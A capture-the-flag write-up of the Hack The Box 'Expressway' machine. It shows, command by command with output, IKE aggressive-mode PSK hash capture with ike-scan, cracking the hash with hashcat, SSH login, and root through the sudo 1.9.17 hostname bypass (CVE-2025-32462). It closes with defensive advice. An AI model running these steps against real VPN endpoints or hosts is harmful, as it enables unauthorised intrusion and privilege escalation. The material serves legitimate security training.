---
title: "HTB - Expressway"
date: 2026-03-06
description: "Easy Linux machine. IKE/IPSec aggressive mode leaks identity and PSK hash, hashcat cracks the PSK, and a sudo 1.9.17 hostname bypass (CVE-2025-32462) grants root by impersonating a host with unrestricted sudo rules."
tags: ["hackthebox", "linux", "easy", "ike", "ipsec", "vpn", "psk", "hashcat", "sudo", "cve-2025-32462", "squid", "udp"]
tools: ["ike-scan", "hashcat", "nmap", "rustscan"]
---

## Overview

{{< callout type="info" >}}
**Attack Path:** UDP scan → IKE/IPSec on 500/udp → `ike-scan` aggressive mode → PSK hash → hashcat → SSH as `ike` → proxy group → Squid logs → `offramp.expressway.htb` → sudo 1.9.17 CVE-2025-32462 → root
{{< /callout >}}

Expressway hides its entire attack surface in UDP. The only TCP port is SSH with no credentials in sight. A UDP scan uncovers an IKE/IPSec VPN endpoint on port 500. Aggressive mode enumeration with `ike-scan` causes the server to leak its own identity (`ike@expressway.htb`) and return a crackable PSK hash. Hashcat recovers the plaintext passphrase, which also works as the SSH password. On the box, membership in the `proxy` group exposes Squid access logs containing a reference to an internal hostname: `offramp.expressway.htb`. Sudo version 1.9.17 is installed at a non-standard path and is vulnerable to CVE-2025-32462, a flaw where the `-h` flag can be used to impersonate a different hostname and inherit its sudoers policy. The `offramp` host has `NOPASSWD: ALL` for `ike`, giving a clean path to root.

{{< htb-box-info name="Expressway" avatar="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/75c168f01f04e5f256838733b77f13ec.png" os="Linux" difficulty="Easy" release="20 Sep 2025" retire="06 Mar 2026" user_blood="VXXDXX" user_blood_url="https://app.hackthebox.com/users/1689134" user_blood_img="https://account.hackthebox.com/storage/users/d74beb59-d339-466e-b08b-743206ee9314-avatar.png" user_blood_time="00:07:26" root_blood="D4rKaCe" root_blood_url="https://app.hackthebox.com/users/1672990" root_blood_img="https://account.hackthebox.com/storage/users/9353f839-0be2-4c3b-b80c-f27621466288-avatar.png" root_blood_time="00:15:30" creator="darkmaddy" creator_url="https://app.hackthebox.com/users/17571" creator_img="https://account.hackthebox.com/storage/users/99e82160-7ec1-4db1-87dc-6a84d677569c-avatar.png" >}}

---

## Enumeration

### TCP

RustScan for a fast initial sweep:

```bash
rustscan -a 10.129.238.52
```

Single port returned:

```
PORT   STATE SERVICE
22/tcp open  ssh
```

Nmap service scan confirms it:

```bash
nmap --privileged -sCV -oN expressway.nmap 10.129.238.52
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
```

OpenSSH 10.0p2. No known exploitable vulnerabilities, no banners hinting at credentials. SSH is a dead end without something to authenticate with. The absence of any web server or other TCP service means the foothold has to come from elsewhere.

### UDP

A TCP-only mindset would end the box here. The name "Expressway" and the single-port result are both signals to check UDP:

```bash
nmap --privileged -sU --top-ports 100 -oN expressway.nmap-udp 10.129.238.52
```

```
PORT      STATE         SERVICE
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
500/udp   open          isakmp
4500/udp  open|filtered nat-t-ike
```

Port 500 is `isakmp`, the signalling protocol for IKE (Internet Key Exchange), which is the handshake layer of IPSec VPNs. Port 4500 is its NAT-Traversal companion. This machine is running a VPN endpoint.

Service enumeration on the interesting ports:

```bash
nmap -sUV -p 69,500,4500 -oN expressway.nmap-udp-service 10.129.238.52
```

```
69/udp   open  tftp   Netkit tftpd or atftpd
500/udp  open  isakmp
```

Port 500 returns IKE handshake data when probed. Time to dig into it properly.

---

## Foothold

### IKE Enumeration

`ike-scan` is the standard tool for interrogating IKE endpoints. It crafts IKE proposals and reads back what the server negotiates:

```bash
ike-scan -M 10.129.238.52
```

```
10.129.238.52   Main Mode Handshake returned
    SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
    VID=09002689dfd6b712
    VID=afcad71368a1f1c96b8696fc77570100
```

The server responds with its accepted cipher suite and two vendor IDs:

| Parameter | Value | Note |
|-----------|-------|------|
| Encryption | 3DES | Legacy, but sufficient for this VPN |
| Hash | SHA1 | Deprecated, crackable offline |
| DH Group | 2 (modp1024) | 1024-bit, weak by current standards |
| Auth | **PSK** | Pre-shared key: hash is capturable and crackable |
| VID `09002689...` | XAUTH | Extended authentication layer (username + password) |
| VID `afcad713...` | Dead Peer Detection | Standard keepalive mechanism |

The critical finding here is `Auth=PSK`. In IKE Phase 1, the pre-shared key is used to compute an HMAC over the exchanged nonces and Diffie-Hellman values. In **aggressive mode** specifically, this hash is exchanged before a secure channel is established, meaning it is transmitted in the clear and can be captured and cracked offline.

### Aggressive Mode: Identity Leak and PSK Hash Capture

Aggressive mode completes the IKE Phase 1 handshake in three packets instead of six. The tradeoff for speed is that identity and hash are exposed before encryption is negotiated:

```bash
ike-scan -P -M -A -n fakeID 10.129.238.52
```

- `-A`: Force aggressive mode
- `-n fakeID`: Our fake client identity (the server doesn't validate this)
- `-P`: Print the PSK hash parameters

The server responds with its own identity before it knows ours is fake:

```
ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
```

The server leaked its own identity: **`ike@expressway.htb`**. A valid username for SSH. More importantly, `ike-scan` captures the PSK hash parameters:

```
IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
725e780824f4dc94...[g_xr]...:89c5388a18f4b7ae...[g_xi]...:734e76ba3b421d2c:86346951e115fa91:...[sai_b]...:...[idir_b]...:8b87baf564b48eae:57fffe8e4f9ea18a...:ad0a0dc391353885
```

This is a nine-component hash blob representing the SKEYID computation from RFC 2409. Hashcat recognises the format directly as mode **5400 (IKE-PSK SHA1)**.

### Cracking the PSK

Save the full hash string to a file and run hashcat:

```bash
hashcat ike.hash /usr/share/wordlists/rockyou.txt
```

Hashcat auto-detects mode 5400:

```
Hash-mode: 5400 | IKE-PSK SHA1

[hash]:freakingrockstarontheroad
```

{{< callout type="info" >}}
If hashcat doesn't auto-detect, specify `-m 5400` explicitly. John the Ripper does not support IKE-PSK SHA1 natively. Hashcat is the correct tool here.
{{< /callout >}}

PSK recovered: **`freakingrockstarontheroad`**

---

### SSH as ike

The cracked PSK works directly as an SSH password for the identity the server leaked:

```bash
ssh ike@expressway.htb
```

```
ike@expressway:~$ cat user.txt
b8c3****************************
```

---

## Privilege Escalation

### Local Enumeration

```bash
id
```

```
uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
```

The `proxy` group is non-standard. Group 13 in Debian is typically assigned to the `proxy` system group, which controls access to proxy-related files and logs. Worth following.

```bash
sudo -l
```

```
Sorry, user ike may not run sudo on expressway.
```

No sudo rights on this hostname. Keep going.

### Squid Proxy Logs

The `proxy` group membership grants read access to Squid's log directory at `/var/log/squid/`. The `access.log.1` file contains an HTTP request that was denied:

```bash
grep -R ".expressway.htb" /var/log/ 2>/dev/null
```

```
/var/log/squid/access.log.1: TCP_DENIED/403 GET http://offramp.expressway.htb - HIER_NONE/- text/html
```

A second hostname: **`offramp.expressway.htb`**. A request from `192.168.68.50` was routed through this Squid proxy to that internal host and denied. The hostname itself doesn't resolve externally, but it appears in the sudoers configuration. That is exactly where this leads.

### Sudo 1.9.17: CVE-2025-32462

Sudo is installed in an unusual location:

```bash
which sudo
```

```
/usr/local/bin/sudo
```

The standard system sudo lives at `/usr/bin/sudo`. A custom build under `/usr/local/bin/` is a deliberate placement worth investigating:

```bash
sudo -V
```

```
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
```

Version **1.9.17** is vulnerable to [CVE-2025-32462](https://www.exploit-db.com/exploits/52354).

**The vulnerability:** sudo supports a `-h <hostname>` flag intended for querying what a remote host's policy allows. In 1.9.17, sudo fails to validate that the specified hostname actually matches the running system. An attacker can pass any hostname and sudo evaluates the policy for that host instead of the real one, impersonating a different machine's sudoers context without authentication.

Check what `ike` can do on `offramp`:

```bash
sudo -l -h offramp.expressway.htb
```

```
User ike may run the following commands on offramp:
    (root) NOPASSWD: ALL
    (root) NOPASSWD: ALL
```

On the `offramp` host, `ike` has unrestricted passwordless sudo. Apply it:

```bash
sudo -h offramp.expressway.htb bash
```

```
root@expressway:/var/log/squid# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root Flag

```bash
cat /root/root.txt
```

```
b78f****************************
```

---

## Summary

| Step | Technique |
|------|-----------|
| Discovery | UDP scan reveals IKE/IPSec on port 500 |
| Enumeration | `ike-scan` aggressive mode leaks identity `ike@expressway.htb` and PSK hash |
| Cracking | hashcat mode 5400 (IKE-PSK SHA1) → `freakingrockstarontheroad` |
| User | SSH with cracked PSK |
| Enumeration | `proxy` group → Squid access logs → `offramp.expressway.htb` |
| PrivEsc | sudo 1.9.17 CVE-2025-32462: `sudo -h offramp.expressway.htb bash` → root |

## Key Takeaways

IKE aggressive mode is a well-documented weakness that has existed since the late 1990s, but it still appears in real-world VPN deployments, particularly in older equipment and in CTF machines designed to reward thorough UDP enumeration. The core issue is structural: aggressive mode trades security for compatibility by sending identity and the PSK-derived hash before the encrypted channel is established. Defenders should prefer IKEv2 (which eliminates aggressive mode entirely) or, if IKEv1 is required, disable aggressive mode explicitly in the VPN concentrator configuration. Monitoring for `ike-scan`-style probes (multiple IKE proposals from a single source in rapid succession) is a reasonable detection heuristic.

The sudo hostname bypass (CVE-2025-32462) is a reminder to treat software version metadata as first-class enumeration output. A custom sudo binary in `/usr/local/bin/` is immediately suspicious: it bypasses the package manager, it may not receive automatic security updates, and it may be intentionally pinned to a vulnerable version. Checking `sudo -V` should be a reflex on any Linux foothold. For defenders, pinning sudo via the package manager and monitoring for out-of-band binaries in `/usr/local/bin/` and `/opt/` with SUID bits or policy implications is a practical hardening step. The sudoers configuration on this machine also illustrates a broader mistake: granting `NOPASSWD: ALL` to any account on any host in the environment, even an "internal" one that is assumed to be unreachable, creates a lateral escalation path the moment an attacker gains a foothold anywhere in the same sudoers scope.
